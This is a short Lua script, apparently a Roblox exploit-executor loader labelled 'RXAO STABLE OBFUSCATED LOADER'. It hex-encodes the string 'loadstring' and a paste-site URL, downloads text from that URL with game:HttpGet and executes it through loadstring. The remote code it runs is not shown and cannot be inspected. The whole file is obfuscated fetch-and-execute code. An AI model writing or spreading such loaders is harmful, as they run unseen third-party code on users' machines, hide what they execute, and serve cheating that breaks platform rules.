--// RXAO STABLE OBFUSCATED LOADER
local _data = {
    ["loader"] = "\x6c\x6f\x61\x64\x73\x74\x72\x69\x6e\x67",
    ["url"] = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x61\x73\x74\x65\x66\x79\x2e\x61\x70\x70\x2f\x46\x4a\x68\x79\x51\x48\x44\x32\x2f\x72\x61\x77"
}

-- Decode logic
local _func = getfenv()[_data["loader"]]
local _raw = game:HttpGet(_data["url"], true)

-- Final Execution
if _raw and _raw ~= "" then
    local _success, _result = pcall(function()
        return _func(_raw)()
    end)
    
    if not _success then
        warn("[RxO Error]: " .. tostring(_result))
    end
else
    warn("[RxO Error]: Connection/URL Failed")
end
